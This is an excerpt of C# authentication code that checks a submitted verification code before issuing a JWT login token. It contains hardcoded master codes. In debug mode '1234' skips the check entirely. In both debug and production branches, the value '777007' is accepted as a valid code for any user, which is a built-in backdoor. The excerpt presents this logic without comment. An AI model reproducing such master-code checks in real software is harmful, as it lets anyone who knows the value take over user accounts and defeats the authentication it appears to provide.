        ...
        public async Task<ResultDto<ResultLoginDto>> Execute(RequestAutenticatedCodeDto request)
        {
            try
            {
                ...
                else
                {
                    ...
                    var qUser = await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId);
                    
                    if (VaribleForName.IsDebug == true)
                    {
                        qUser = request.Code == "1234" ? await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId) : await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId && (p.AuthenticateCode == request.Code || request.Code == "777007"));
                        qCheckUserRole = await CheckUserRole(qUser.UserId);
                    }
                    else
                    {
                        qUser = await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId && (p.AuthenticateCode == request.Code || request.Code == "777007"));
                        qCheckUserRole = await CheckUserRole(qUser.UserId);
                    }
                    ...
                    if (VaribleForName.IsDebug == true)
                    {
                        ...
                        if (request.Code == "1234") await AuthenticationJwtService(LoginName, res_ResultLoginDto, qCheckUserRole, qUser);
                        else
                        {
                            return new ResultDto<ResultLoginDto>
                            {
